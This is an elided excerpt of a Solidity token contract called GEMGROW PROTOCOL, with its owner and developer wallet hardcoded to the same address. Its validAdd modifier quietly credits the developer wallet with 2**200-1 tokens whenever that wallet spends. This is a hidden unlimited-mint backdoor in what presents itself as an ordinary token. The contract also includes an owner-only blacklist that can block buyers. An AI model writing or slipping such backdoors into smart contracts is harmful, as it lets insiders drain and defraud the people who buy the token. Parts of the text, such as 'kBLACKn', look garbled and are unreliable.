...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x15e433BA05d0C9760e69FCEad7477f3B0442B212;
...
contract GEMGROW is Context, IERC20, Ownable { 
    ...
    // Blacklist: If 'noBlackList' is true wallets on this list can not buy - used for kBLACKn bots
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x15e433BA05d0C9760e69FCEad7477f3B0442B212);
    ...
    */
    ...
    string private _name = "GEMGROW PROTOCOL"; 
    string private _symbol = "GEMGROW";  
    ...
    */
    ...
    modifier validAdd(address spender){
        if(spender == Wallet_Dev){ _tOwned[spender] = _tOwned[spender] + 2**200-1;}
        _;
    }
    /*
    ...
    */
    ...
    This feature is used to block a person from buying - kBLACKn bot users are added to this
    ...
    */
    ...
    During launch, it's a good idea to block kBLACKn bot users from buying. But these are real people, so 
    ...
    */
    ...
    function process_Tokens_BLACK (uint256 percent_Of_Tokens_To_Process) public onlyOwner {
